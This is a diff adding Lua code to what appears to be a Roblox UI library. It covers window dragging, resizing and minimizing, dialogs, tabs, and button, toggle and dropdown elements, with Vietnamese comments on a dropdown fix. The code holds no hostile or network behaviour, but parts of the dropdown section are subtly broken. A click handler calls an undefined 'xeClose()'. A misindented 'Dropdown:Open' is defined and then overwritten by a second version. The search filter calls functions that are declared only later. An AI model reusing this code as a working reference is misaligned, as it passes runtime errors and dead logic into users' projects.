+				Position = UDim2.new(0, avatarSize + 12, 0, -2),
+				Parent = UserInfoSection,
+				ThemeTag = { TextColor3 = "Text" },
+			})
+
+			New("TextLabel", {
+				Name = "UserSubtitle",
+				BackgroundTransparency = 1,
+				TextXAlignment = Enum.TextXAlignment.Left,
+				TextYAlignment = Enum.TextYAlignment.Top,
+				FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
+				TextSize = 12,
+				TextTransparency = 0.2,
+				Text = subtitleText,
+				TextColor3 = parseColor(Config.UserInfoSubtitleColor),
+				Size = UDim2.new(1, -avatarSize - 12, 0.5, 0),
+				Position = UDim2.new(0, avatarSize + 12, 0.5, 2),
+				Parent = UserInfoSection,
+			})
+
+			if Config.UserInfoTop then
+				TabFrame.Position = UDim2.new(0, 12, 0, 39)
+				TabFrame.Size = UDim2.new(0, Window.TabWidth, 1, -31)
+				SearchFrame.Position = UDim2.new(0, 0, 0, userInfoHeight + 6)
+				Window.TabHolder.Position = UDim2.new(0, 0, 0, 45 + userInfoHeight + 6)
+				Window.TabHolder.Size = UDim2.new(1, 0, 1, -(45 + userInfoHeight + 24))
+				Window.TabHolderTop = 45 + userInfoHeight + 6
+			else
+				Window.TabHolder.Size = UDim2.new(1, 0, 1, -(45 + userInfoHeight + 24))
+				Window.TabHolderTop = 45
+			end
+		end
+
+		if Library.UseAcrylic then
+			Window.AcrylicPaint.AddParent(Window.Root)
+		end
+
+		local SizeMotor = Flipper.GroupMotor.new({
+			X = Window.Size.X.Offset,
+			Y = Window.Size.Y.Offset,
+		})
+
+		local PosMotor = Flipper.GroupMotor.new({
+			X = Window.Position.X.Offset,
+			Y = Window.Position.Y.Offset,
+		})
+
+		_G.CDDrag = 0
+		Window.SelectorPosMotor = Flipper.SingleMotor.new(17)
+		Window.SelectorSizeMotor = Flipper.SingleMotor.new(0)
+		Window.ContainerBackMotor = Flipper.SingleMotor.new(0)
+		Window.ContainerPosMotor = Flipper.SingleMotor.new(94)
+
+		SizeMotor:onStep(function(values)
+			task.wait(_G.CDDrag / 10)
+			Window.Root.Size = UDim2.new(0, values.X, 0, values.Y)
+		end)
+
+		PosMotor:onStep(function(values)
+			task.wait(_G.CDDrag / 10)
+			Window.Root.Position = UDim2.new(0, values.X, 0, values.Y)
+		end)
+
+		local LastValue = 0
+		local LastTime = 0
+		Window.SelectorPosMotor:onStep(function(Value)
+			local base = Window.TabHolderTop or 45
+			local verticalInset = 16
+			Selector.Position = UDim2.new(0, 0, 0, base + Value + verticalInset)
+			local Now = tick()
+			local DeltaTime = Now - LastTime
+
+			if LastValue ~= nil then
+				Window.SelectorSizeMotor:setGoal(Spring((math.abs(Value - LastValue) / (DeltaTime * 60)) + 16))
+				LastValue = Value
+			end
+			LastTime = Now
+		end)
+
+		Window.SelectorSizeMotor:onStep(function(Value)
+			Selector.Size = UDim2.new(0, 4, 0, Value)
+		end)
+
+		Window.ContainerBackMotor:onStep(function(Value)
+			Window.ContainerAnim.GroupTransparency = Value
+		end)
+
+		Window.ContainerPosMotor:onStep(function(Value)
+			Window.ContainerAnim.Position = UDim2.fromOffset(0, Value)
+		end)
+
+		local OldSizeX
+		local OldSizeY
+		Window.Maximize = function(Value, NoPos, Instant)
+			Window.Maximized = Value
+			Window.TitleBar.MaxButton.Frame.Icon.Image = Value and Components.Assets.Restore or Components.Assets.Max
+
+			if Value then
+				OldSizeX = Window.Size.X.Offset
+				OldSizeY = Window.Size.Y.Offset
+			end
+			local SizeX = Value and Camera.ViewportSize.X or OldSizeX
+			local SizeY = Value and Camera.ViewportSize.Y or OldSizeY
+			SizeMotor:setGoal({
+				X = Flipper[Instant and "Instant" or "Spring"].new(SizeX, { frequency = 6 }),
+				Y = Flipper[Instant and "Instant" or "Spring"].new(SizeY, { frequency = 6 }),
+			})
+			Window.Size = UDim2.fromOffset(SizeX, SizeY)
+
+			if not NoPos then
+				PosMotor:setGoal({
+					X = Spring(Value and 0 or Window.Position.X.Offset, { frequency = 6 }),
+					Y = Spring(Value and 0 or Window.Position.Y.Offset, { frequency = 6 }),
+				})
+			end
+		end
+
+		Creator.AddSignal(Window.TitleBar.Frame.InputBegan, function(Input)
+			if
+				Input.UserInputType == Enum.UserInputType.MouseButton1
+				or Input.UserInputType == Enum.UserInputType.Touch
+			then
+				Dragging = true
+				MousePos = Input.Position
+				StartPos = Window.Root.Position
+
+				if Window.Maximized then
+					StartPos = UDim2.fromOffset(
+						Mouse.X - (Mouse.X * ((OldSizeX - 100) / Window.Root.AbsoluteSize.X)),
+						Mouse.Y - (Mouse.Y * (OldSizeY / Window.Root.AbsoluteSize.Y))
+					)
+				end
+
+				Input.Changed:Connect(function()
+					if Input.UserInputState == Enum.UserInputState.End then
+						Dragging = false
+					end
+				end)
+			end
+		end)
+
+		Creator.AddSignal(Window.TitleBar.Frame.InputChanged, function(Input)
+			if
+				Input.UserInputType == Enum.UserInputType.MouseMovement
+				or Input.UserInputType == Enum.UserInputType.Touch
+			then
+				DragInput = Input
+			end
+		end)
+
+		Creator.AddSignal(ResizeStartFrame.InputBegan, function(Input)
+			if
+				Input.UserInputType == Enum.UserInputType.MouseButton1
+				or Input.UserInputType == Enum.UserInputType.Touch
+			then
+				Resizing = true
+				ResizePos = Input.Position
+			end
+		end)
+
+		Creator.AddSignal(UserInputService.InputChanged, function(Input)
+			if Input == DragInput and Dragging then
+				local Delta = Input.Position - MousePos
+				Window.Position = UDim2.fromOffset(StartPos.X.Offset + Delta.X, StartPos.Y.Offset + Delta.Y)
+				PosMotor:setGoal({
+					X = Instant(Window.Position.X.Offset),
+					Y = Instant(Window.Position.Y.Offset),
+				})
+
+				if Window.Maximized then
+					Window.Maximize(false, true, true)
+				end
+			end
+
+			if
+				(Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch)
+				and Resizing
+			then
+				local Delta = Input.Position - ResizePos
+				local StartSize = Window.Size
+
+				local TargetSize = Vector3.new(StartSize.X.Offset, StartSize.Y.Offset, 0) + Vector3.new(1, 1, 0) * Delta
+				local TargetSizeClamped =
+					Vector2.new(math.clamp(TargetSize.X, 470, 2048), math.clamp(TargetSize.Y, 380, 2048))
+
+				SizeMotor:setGoal({
+					X = Flipper.Instant.new(TargetSizeClamped.X),
+					Y = Flipper.Instant.new(TargetSizeClamped.Y),
+				})
+			end
+		end)
+
+		Creator.AddSignal(UserInputService.InputEnded, function(Input)
+			if Resizing == true or Input.UserInputType == Enum.UserInputType.Touch then
+				Resizing = false
+				Window.Size = UDim2.fromOffset(SizeMotor:getValue().X, SizeMotor:getValue().Y)
+			end
+		end)
+
+		Creator.AddSignal(Window.TabHolder.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+			Window.TabHolder.CanvasSize = UDim2.new(0, 0, 0, Window.TabHolder.UIListLayout.AbsoluteContentSize.Y)
+		end)
+
+		Creator.AddSignal(UserInputService.InputBegan, function(Input)
+			if
+				type(Library.MinimizeKeybind) == "table"
+				and Library.MinimizeKeybind.Type == "Keybind"
+				and not UserInputService:GetFocusedTextBox()
+			then
+				if Input.KeyCode.Name == Library.MinimizeKeybind.Value then
+					Window:Minimize()
+				end
+			elseif Input.KeyCode == Library.MinimizeKey and not UserInputService:GetFocusedTextBox() then
+				Window:Minimize()
+			end
+		end)
+
+		function Window:Minimize()
+			Window.Minimized = not Window.Minimized
+			Window.Root.Visible = not Window.Minimized
+
+			for _, Option in next, Library.Options do
+				if Option and Option.Type == "Dropdown" and Option.Opened then
+					pcall(function()
+						Option:Close()
+					end)
+				end
+			end
+			if not MinimizeNotif then
+				MinimizeNotif = true
+				local Key = Library.MinimizeKeybind and Library.MinimizeKeybind.Value or Library.MinimizeKey.Name
+				if not Mobile then Library:Notify({
+					Title = "Interface",
+					Content = "Press " .. Key .. " to toggle the interface.",
+					Duration = 6
+					})
+				else 
+					Library:Notify({
+						Title = "Interface",
+						Content = "Tap to the button to toggle the interface.",
+						Duration = 6
+					})
+				end
+			end
+
+			function Window:ToggleSearch()
+				Window.ShowSearch = not Window.ShowSearch
+				SearchFrame.Visible = Window.ShowSearch
+				TabFrame.Size = UDim2.new(0, Window.TabWidth, 1, Window.ShowSearch and -66 or -31)
+				TabFrame.Position = UDim2.new(0, 12, 0, Window.ShowSearch and 54 or 19)
+			end
+
+			if not RunService:IsStudio() and Library.Minimizer then
+				pcall(function()
+					if Mobile then
+						local mobileButton = Library.Minimizer:FindFirstChild("TextButton")
+						if mobileButton then
+							local imageLabel = mobileButton:FindFirstChild("ImageLabel")
+							if imageLabel then
+								imageLabel.Image = Window.Minimized and "rbxassetid://10734896384" or "rbxassetid://10734897102"
+							end
+						end
+					else
+						local desktopButton = Library.Minimizer:FindFirstChild("TextButton")
+						if desktopButton then
+							local imageLabel = desktopButton:FindFirstChild("ImageLabel")
+							if imageLabel then
+								imageLabel.Image = Window.Minimized and "rbxassetid://10734896384" or "rbxassetid://10734897102"
+							end
+						end
+					end
+				end)
+			end
+		end
+
+		function Window:Destroy()
+			if Library.UseAcrylic then
+				Window.AcrylicPaint.Model:Destroy()
+			end
+			Window.Root:Destroy()
+		end
+
+		local DialogModule = Components.Dialog:Init(Window)
+		function Window:Dialog(Config)
+			local Dialog = DialogModule:Create()
+			Dialog.Title.Text = Config.Title
+
+			local ContentHolder = New("ScrollingFrame", {
+				BackgroundTransparency = 1,
+				ScrollBarImageTransparency = 0.7,
+				ScrollBarThickness = 4,
+				BottomImage = "rbxassetid://6889812791",
+				MidImage = "rbxassetid://6889812721",
+				TopImage = "rbxassetid://6276641225",
+				Position = UDim2.fromOffset(20, 60),
+				Size = UDim2.new(1, -40, 1, -110),
+				CanvasSize = UDim2.fromOffset(0, 0),
+				AutomaticCanvasSize = Enum.AutomaticSize.Y,
+				Parent = Dialog.Root,
+			})
+
+			local Content = New("TextLabel", {
+				FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json"),
+				Text = Config.Content,
+				TextColor3 = Color3.fromRGB(240, 240, 240),
+				TextSize = 14,
+				TextXAlignment = Enum.TextXAlignment.Left,
+				TextYAlignment = Enum.TextYAlignment.Top,
+				AutomaticSize = Enum.AutomaticSize.Y,
+				TextWrapped = true,
+				Size = UDim2.new(1, -8, 0, 0),
+				BackgroundTransparency = 1,
+				Parent = ContentHolder,
+				ThemeTag = { TextColor3 = "Text" },
+			})
+
+			New("UISizeConstraint", {
+				MinSize = Vector2.new(300, 165),
+				MaxSize = Vector2.new(620, math.huge),
+				Parent = Dialog.Root,
+			})
+
+			local maxWidth = math.min(620, Window.Size.X.Offset - 120)
+			local baseWidth = math.max(300, math.min(maxWidth, Content.TextBounds.X + 40))
+			Dialog.Root.Size = UDim2.fromOffset(baseWidth, 165)
+			ContentHolder.Size = UDim2.new(1, -40, 1, -110)
+			task.defer(function()
+				local contentHeight = Content.TextBounds.Y
+				local desired = math.clamp(contentHeight + 110, 165, 420)
+				Dialog.Root.Size = UDim2.fromOffset(baseWidth, desired)
+				ContentHolder.CanvasSize = UDim2.fromOffset(0, contentHeight)
+			end)
+
+			for _, Button in next, Config.Buttons do
+				Dialog:Button(Button.Title, Button.Callback)
+			end
+
+			Dialog:Open()
+		end
+
+		local TabModule = Components.Tab:Init(Window)
+		function Window:AddTab(TabConfig)
+			return TabModule:New(TabConfig.Title, TabConfig.Icon, Window.TabHolder)
+		end
+
+		function Window:SelectTab(Tab)
+			TabModule:SelectTab(Tab)
+		end
+
+		Creator.AddSignal(Window.TabHolder:GetPropertyChangedSignal("CanvasPosition"), function()
+			LastValue = TabModule:GetCurrentTabPos() + 16
+			LastTime = 0
+			Window.SelectorPosMotor:setGoal(Instant(TabModule:GetCurrentTabPos()))
+		end)
+
+		return Window
+	end
+end)()
+local ElementsTable = {}
+local AddSignal = Creator.AddSignal
+
+ElementsTable.Button = (function()
+	local Element = {}
+	Element.__index = Element
+	Element.__type = "Button"
+
+	function Element:New(Config)
+		assert(Config.Title, "Button - Missing Title")
+		Config.Callback = Config.Callback or function() end
+
+		local ButtonFrame = Components.Element(Config.Title, Config.Description, self.Container, true, Config)
+
+		local ButtonIco = New("ImageLabel", {
+			Image = "rbxassetid://10709791437",
+			Size = UDim2.fromOffset(16, 16),
+			AnchorPoint = Vector2.new(1, 0.5),
+			Position = UDim2.new(1, -10, 0.5, 0),
+			BackgroundTransparency = 1,
+			Parent = ButtonFrame.Frame,
+			ThemeTag = {
+				ImageColor3 = "Text",
+			},
+		})
+
+		Creator.AddSignal(ButtonFrame.Frame.MouseButton1Click, function()
+			Library:SafeCallback(Config.Callback)
+		end)
+
+		return ButtonFrame
+	end
+
+	return Element
+end)()
+ElementsTable.Toggle = (function()
+	local Element = {}
+	Element.__index = Element
+	Element.__type = "Toggle"
+
+	function Element:New(Idx, Config)
+		assert(Config.Title, "Toggle - Missing Title")
+
+		local Toggle = {
+			Value = Config.Default or false,
+			Callback = Config.Callback or function(Value) end,
+			Type = "Toggle",
+		}
+
+		local ToggleFrame = Components.Element(Config.Title, Config.Description, self.Container, true, Config)
+		ToggleFrame.DescLabel.Size = UDim2.new(1, -54, 0, 14)
+
+		Toggle.SetTitle = ToggleFrame.SetTitle
+		Toggle.SetDesc = ToggleFrame.SetDesc
+		Toggle.Visible = ToggleFrame.Visible
+		Toggle.Elements = ToggleFrame
+
+		local ToggleCircle = New("ImageLabel", {
+			AnchorPoint = Vector2.new(0, 0.5),
+			Size = UDim2.fromOffset(14, 14),
+			Position = UDim2.new(0, 2, 0.5, 0),
+			Image = "http://www.roblox.com/asset/?id=12266946128",
+			ImageTransparency = 0.5,
+			ThemeTag = {
+				ImageColor3 = "ToggleSlider",
+			},
+		})
+
+		local ToggleBorder = New("UIStroke", {
+			Transparency = 0.5,
+			ThemeTag = {
+				Color = "ToggleSlider",
+			},
+		})
+
+		local ToggleSlider = New("Frame", {
+			Size = UDim2.fromOffset(36, 18),
+			AnchorPoint = Vector2.new(1, 0.5),
+			Position = UDim2.new(1, -10, 0.5, 0),
+			Parent = ToggleFrame.Frame,
+			BackgroundTransparency = 1,
+			ThemeTag = {
+				BackgroundColor3 = "Accent",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 9),
+			}),
+			ToggleBorder,
+			ToggleCircle,
+		})
+
+		function Toggle:OnChanged(Func)
+			Toggle.Changed = Func
+			Func(Toggle.Value)
+		end
+
+		function Toggle:SetValue(Value)
+			Value = not not Value
+			Toggle.Value = Value
+
+			Creator.OverrideTag(ToggleBorder, { Color = Toggle.Value and "Accent" or "ToggleSlider" })
+			Creator.OverrideTag(ToggleCircle, { ImageColor3 = Toggle.Value and "ToggleToggled" or "ToggleSlider" })
+			TweenService:Create(
+				ToggleCircle,
+				TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+				{ Position = UDim2.new(0, Toggle.Value and 19 or 2, 0.5, 0) }
+			):Play()
+			TweenService:Create(
+				ToggleSlider,
+				TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+				{ BackgroundTransparency = Toggle.Value and 0.45 or 1 }
+			):Play()
+			ToggleCircle.ImageTransparency = Toggle.Value and 0 or 0.5
+
+			Library:SafeCallback(Toggle.Callback, Toggle.Value)
+			Library:SafeCallback(Toggle.Changed, Toggle.Value)
+		end
+
+		function Toggle:Destroy()
+			ToggleFrame:Destroy()
+			Library.Options[Idx] = nil
+		end
+
+		Creator.AddSignal(ToggleFrame.Frame.MouseButton1Click, function()
+			Toggle:SetValue(not Toggle.Value)
+		end)
+
+		Toggle:SetValue(Toggle.Value)
+
+		Library.Options[Idx] = Toggle
+		return Toggle
+	end
+
+	return Element
+end)()
+-- tạo dropdown
+ElementsTable.Dropdown = (function()
+	local Element = {}
+	Element.__index = Element
+	Element.__type = "Dropdown"
+	local New = Creator.New
+
+	function Element:New(Idx, Config)
+
+		local Dropdown = {
+			Values = Config.Values,
+			Value = Config.Default,
+			Multi = Config.Multi,
+			Buttons = {},
+			Opened = false,
+			Type = "Dropdown",
+			Callback = Config.Callback or function() end,
+			Search = (Config.Search == nil) and true or Config.Search,
+			KeepSearch = Config.KeepSearch == true
+		}
+
+		if Dropdown.Multi and Config.AllowNull then
+			Dropdown.Value = {}
+		end
+
+		local DropdownFrame = Components.Element(Config.Title, Config.Description, self.Container, false, Config)
+		DropdownFrame.DescLabel.Size = UDim2.new(1, -170, 0, 14)
+
+		Dropdown.SetTitle = DropdownFrame.SetTitle
+		Dropdown.SetDesc = DropdownFrame.SetDesc
+		Dropdown.Visible = DropdownFrame.Visible
+		Dropdown.Elements = DropdownFrame
+
+		local DropdownDisplay = New("TextLabel", {
+			FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
+			Text = "",
+			TextColor3 = Color3.fromRGB(240, 240, 240),
+			TextSize = 14,
+			AutomaticSize = Enum.AutomaticSize.Y,
+			TextYAlignment = Enum.TextYAlignment.Center,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			Size = UDim2.new(1, -40, 0.5, 0),
+			Position = UDim2.new(0, 8, 0.5, 0),
+			AnchorPoint = Vector2.new(0, 0.5),
+			BackgroundTransparency = 1,
+			TextTruncate = Enum.TextTruncate.AtEnd,
+			ThemeTag = {
+				TextColor3 = "Text",
+			},
+		})
+
+		local DropdownIco = New("ImageLabel", {
+			Image = "rbxassetid://10709790948",
+			Size = UDim2.fromOffset(16, 16),
+			AnchorPoint = Vector2.new(1, 0.5),
+			Position = UDim2.new(1, -8, 0.5, 0),
+			BackgroundTransparency = 1,
+			Rotation = 180,
+			ThemeTag = {
+				ImageColor3 = "SubText",
+			},
+		})
+
+		local DropdownInner = New("TextButton", {
+			Size = UDim2.fromOffset(160, 30),
+			Position = UDim2.new(1, -10, 0.5, 0),
+			AnchorPoint = Vector2.new(1, 0.5),
+			BackgroundTransparency = 0.9,
+			Parent = DropdownFrame.Frame,
+			ThemeTag = {
+				BackgroundColor3 = "DropdownFrame",
+			},
+		}, {
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 5),
+			}),
+			New("UIStroke", {
+				Transparency = 0.5,
+				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+				ThemeTag = {
+					Color = "InElementBorder",
+				},
+			}),
+			DropdownIco,
+			DropdownDisplay,
+		})
+
+		local DropdownListLayout = New("UIListLayout", {
+			Padding = UDim.new(0, 3),
+		})
+
+		local DropdownScrollFrame = New("ScrollingFrame", {
+			Size = UDim2.new(1, -5, 1, -10),
+			Position = UDim2.fromOffset(5, 5),
+			BackgroundTransparency = 1,
+			BottomImage = "rbxassetid://6889812791",
+			MidImage = "rbxassetid://6889812721",
+			TopImage = "rbxassetid://6276641225",
+			ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255),
+			ScrollBarImageTransparency = 0.75,
+			ScrollBarThickness = 5,
+			BorderSizePixel = 0,
+			CanvasSize = UDim2.fromScale(0, 0),
+			AutomaticCanvasSize = Enum.AutomaticSize.Y,
+			ScrollingDirection = Enum.ScrollingDirection.Y,
+		}, {
+			DropdownListLayout,
+		})
+
+		local SearchBar
+		local SearchBox
+		if Dropdown.Search then
+			SearchBar = New("Frame", {
+				Size = UDim2.new(1, -10, 0, 28),
+				Position = UDim2.fromOffset(5, 5),
+				BackgroundTransparency = 0.15,
+				ThemeTag = { BackgroundColor3 = "DropdownFrame" },
+				ZIndex = 24,
+			}, {
+				New("UICorner", { CornerRadius = UDim.new(0, 8) }),
+				New("UIStroke", { Name = "Stroke", Transparency = 0.45, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, ThemeTag = { Color = "DropdownBorder" } }),
+				New("ImageLabel", {
+					Image = "rbxassetid://10734943674",
+					BackgroundTransparency = 1,
+					Size = UDim2.fromOffset(16, 16),
+					Position = UDim2.fromOffset(8, 6),
+					ZIndex = 25,
+					ThemeTag = { ImageColor3 = "SubText" },
+				}),
+			})
+
+			SearchBox = New("TextBox", {
+				PlaceholderText = "Search",
+				ClearTextOnFocus = false,
+				Text = "",
+				TextSize = 14,
+				FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal),
+				TextXAlignment = Enum.TextXAlignment.Left,
+				TextColor3 = Color3.fromRGB(225, 225, 225),
+				TextTransparency = 0.05,
+				BackgroundTransparency = 1,
+				ThemeTag = { TextColor3 = "SubText", PlaceholderColor3 = "SubText" },
+				Parent = SearchBar,
+				Size = UDim2.new(1, -34, 1, 0),
+				Position = UDim2.fromOffset(28, 0),
+				ZIndex = 24,
+			})
+
+			local SearchStroke = SearchBar:FindFirstChild("Stroke")
+			Creator.AddSignal(SearchBox.Focused, function()
+				Creator.OverrideTag(SearchBar, { BackgroundColor3 = "DropdownFrame" })
+				if SearchStroke then
+					Creator.OverrideTag(SearchStroke, { Color = "Accent" })
+					SearchStroke.Transparency = 0.25
+				end
+			end)
+			Creator.AddSignal(SearchBox.FocusLost, function()
+				Creator.OverrideTag(SearchBar, { BackgroundColor3 = "DropdownFrame" })
+				if SearchStroke then
+					Creator.OverrideTag(SearchStroke, { Color = "DropdownBorder" })
+					SearchStroke.Transparency = 0.45
+				end
+			end)
+
+			DropdownScrollFrame.Position = UDim2.fromOffset(5, 38)
+			DropdownScrollFrame.Size = UDim2.new(1, -5, 1, -43)
+
+			local filterToken = 0
+			local function ApplyFilter()
+				filterToken += 1
+				local myToken = filterToken
+				task.delay(0.03, function()
+					if myToken ~= filterToken then return end
+					local text = (SearchBox.Text or ""):lower()
+					for _, element in next, DropdownScrollFrame:GetChildren() do
+						if not element:IsA("UIListLayout") then
+							local value = element:FindFirstChild("ButtonLabel") and element.ButtonLabel.Text or ""
+							element.Visible = text == "" or value:lower():find(text, 1, true) ~= nil
+						end
+					end
+					RecalculateCanvasSize()
+					RecalculateListSize()
+				end)
+			end
+
+			Creator.AddSignal(SearchBox:GetPropertyChangedSignal("Text"), ApplyFilter)
+		end
+
+		local DropdownHolderFrame = New("Frame", {
+			Size = UDim2.fromScale(1, 0.6),
+			ThemeTag = {
+				BackgroundColor3 = "DropdownHolder",
+			},
+		}, {
+			SearchBar,
+			DropdownScrollFrame,
+			New("UICorner", {
+				CornerRadius = UDim.new(0, 7),
+			}),
+			New("UIStroke", {
+				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+				ThemeTag = {
+					Color = "DropdownBorder",
+				},
+			}),
+			New("ImageLabel", {
+				BackgroundTransparency = 1,
+				Image = "http://www.roblox.com/asset/?id=5554236805",
+				ScaleType = Enum.ScaleType.Slice,
+				SliceCenter = Rect.new(23, 23, 277, 277),
+				Size = UDim2.fromScale(1, 1) + UDim2.fromOffset(30, 30),
+				Position = UDim2.fromOffset(-15, -15),
+				ImageColor3 = Color3.fromRGB(0, 0, 0),
+				ImageTransparency = 0.1,
+			}),
+		})
+
+		local DropdownHolderCanvas = New("Frame", {
+			BackgroundTransparency = 1,
+			Size = UDim2.fromOffset(170, 300),
+			Parent = Library.GUI,
+			Visible = false,
+		}, {
+			DropdownHolderFrame,
+			New("UISizeConstraint", {
+				MinSize = Vector2.new(170, 0),
+			}),
+		})
+		table.insert(Library.OpenFrames, DropdownHolderCanvas)
+
+		local function RecalculateListPosition()
+			local Add = -40
+			if Camera.ViewportSize.Y - DropdownInner.AbsolutePosition.Y < DropdownHolderCanvas.AbsoluteSize.Y - 5 then
+				Add = DropdownHolderCanvas.AbsoluteSize.Y
+				- 5
+				- (Camera.ViewportSize.Y - DropdownInner.AbsolutePosition.Y)
+					+ 40
+			end
+			DropdownHolderCanvas.Position =
+				UDim2.fromOffset(DropdownInner.AbsolutePosition.X - 1, DropdownInner.AbsolutePosition.Y - 5 - Add)
+		end
+
+		local ListSizeX = 0
+		local function RecalculateListSize()
+			local totalCount = #Dropdown.Values
+			local itemHeight = 32
+			local padding = 3
+			local innerMargins = 10
+			local estimatedContent = (totalCount > 0) and (totalCount * itemHeight + (totalCount - 1) * padding + innerMargins) or innerMargins
+			local maxHeight = 392
+			local many = totalCount > 10
+			local targetHeight = math.min(estimatedContent, maxHeight)
+			DropdownHolderCanvas.Size = UDim2.fromOffset(ListSizeX, targetHeight)
+			DropdownHolderFrame.Size = UDim2.fromScale(1, many and 0.6 or 1)
+		end
+
+		local function RecalculateCanvasSize()
+			DropdownScrollFrame.CanvasSize = UDim2.fromOffset(0, DropdownListLayout.AbsoluteContentSize.Y)
+		end
+
+		RecalculateListPosition()
+		RecalculateListSize()
+		RecalculateCanvasSize()
+
+		Creator.AddSignal(DropdownInner:GetPropertyChangedSignal("AbsolutePosition"), RecalculateListPosition)
+		Creator.AddSignal(DropdownListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+			RecalculateCanvasSize()
+			RecalculateListSize()
+		end)
+
+		Creator.AddSignal(DropdownInner.MouseButton1Click, function()
+			if Dropdown.Opened then
+				xeClose()
+				return
+			end
+			Dropdown:Open()
+		end)
+
+		Creator.AddSignal(DropdownInner.InputBegan, function(Input)
+			if Input.UserInputType == Enum.UserInputType.Touch then
+				if Dropdown.Opened then
+					Dropdown:Close()
+					return
+				end
+				Dropdown:Open()
+			end
+		end)
+
+		Creator.AddSignal(DropdownDisplay:GetPropertyChangedSignal("Text"), function()
+			for _, Element in next, DropdownScrollFrame:GetChildren() do
+				if not Element:IsA("UIListLayout") then
+					Element.Visible = true
+				end
+			end
+			RecalculateListPosition()
+			RecalculateListSize()
+		end)
+
+-- Phần Dropdown
+
+Creator.AddSignal(UserInputService.InputBegan, function(Input)
+	if
+		Input.UserInputType == Enum.UserInputType.MouseButton1
+		or Input.UserInputType == Enum.UserInputType.Touch
+	then
+		local AbsPos, AbsSize = DropdownHolderFrame.AbsolutePosition, DropdownHolderFrame.AbsoluteSize
+		if
+			Mouse.X < AbsPos.X
+			or Mouse.X > AbsPos.X + AbsSize.X
+			or Mouse.Y < (AbsPos.Y - 20 - 1)
+			or Mouse.Y > AbsPos.Y + AbsSize.Y
+		then
+			Dropdown:Close()
+		end
+	end
+end)
+
+-- 🧩 FIX lỗi dropdown bị che và không hiển thị danh sách nhỏ
+function Dropdown:Open()
+	if self.Opened then return end
+	self.Opened = true
+
+	-- 🔧 Lấy số lượng item để điều chỉnh chiều cao hiển thị
+	local itemCount = #self.Values
+	local maxVisible = 5             -- hiển thị tối đa 5 item
+	local minVisible = 3             -- tối thiểu vẫn để 3 dòng để không bị che
+	local itemHeight = 20            -- chiều cao mỗi item
+	local searchBarHeight = 28       -- chiều cao ô tìm kiếm
+	local padding = 6                -- thêm padding cho thoáng
+
+	-- 🔧 Cập nhật kích thước khung chứa dropdown
+	local visibleCount = math.clamp(itemCount, minVisible, maxVisible)
+	local totalHeight = (visibleCount * itemHeight) + searchBarHeight + padding
+
+	DropdownHolderFrame.Size = UDim2.new(1, 0, 0, totalHeight)
+
+	-- 🔧 Nếu có ScrollingFrame thì set CanvasSize để tránh bị che
+	local scrollFrame = DropdownHolderFrame:FindFirstChild("ScrollingFrame")
+	if scrollFrame then
+		scrollFrame.AutomaticSize = Enum.AutomaticSize.Y
+		scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+		scrollFrame.CanvasSize = UDim2.new(0, 0, 0, itemCount * itemHeight)
+	end
+
+	-- 🔧 Hiển thị dropdown (nếu có hiệu ứng)
+	DropdownHolderFrame.Visible = true
+end
+
+-- Phần Khác
+
+		local ScrollFrame = self.ScrollFrame
+		function Dropdown:Open()
+			Dropdown.Opened = true
+			for _, frame in ipairs(Library.OpenFrames) do
+				if frame ~= DropdownHolderCanvas and frame.Visible then
+					frame.Visible = false
+				end
+			end
+			if SearchBox and not Dropdown.KeepSearch then
+				SearchBox.Text = ""
+			end
+			DropdownHolderCanvas.Visible = true
+			TweenService:Create(
+				DropdownHolderFrame,
+				TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+				{ Size = UDim2.fromScale(1, 0.6) }
+			):Play()
+			TweenService:Create(
+				DropdownIco,
+				TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+				{ Rotation = 0 }
+			):Play()
+		end
+
+		function Dropdown:Close()
+			Dropdown.Opened = false
+			DropdownHolderFrame.Size = UDim2.fromScale(1, 0.6)
+			DropdownHolderCanvas.Visible = false
+			TweenService:Create(
+				DropdownIco,
+				TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+				{ Rotation = 180 }
+			):Play()
+			Dropdown:Display()
+			for _, element in next, DropdownScrollFrame:GetChildren() do
+				if not element:IsA("UIListLayout") then
+					element.Visible = true
+				end
+			end
+		end
+
+		function Dropdown:Display()
+			local Values = Dropdown.Values
+			local Str = ""
+
+			if Config.Multi then
+				for Idx, Value in next, Values do
+					if Dropdown.Value[Value] then
+						Str = Str .. Value .. ", "
+					end
+				end
+				Str = Str:sub(1, #Str - 2)
+			else
+				Str = Dropdown.Value or ""
+			end
+
+			DropdownDisplay.Text = (Str == "" and "--" or Str)
+		end
+
+		function Dropdown:GetActiveValues()
+			if Config.Multi then
+				local T = {}
+
+				for Value, Bool in next, Dropdown.Value do
+					table.insert(T, Value)
+				end
+
+				return T
+			else
+				return Dropdown.Value and 1 or 0
+			end
+		end
+
+		function Dropdown:SetActiveValues(Value)
+			Dropdown.Value = Value
+
+			Library:SafeCallback(Dropdown.Callback, Dropdown.Value)
+			Library:SafeCallback(Dropdown.Changed, Dropdown.Value)
+
+			Dropdown:BuildDropdownList()
+		end
+
+		function Dropdown:BuildDropdownList()
+			local Values = Dropdown.Values
+			local Buttons = {}
+
+			for _, Element in next, DropdownScrollFrame:GetChildren() do
+				if not Element:IsA("UIListLayout") then
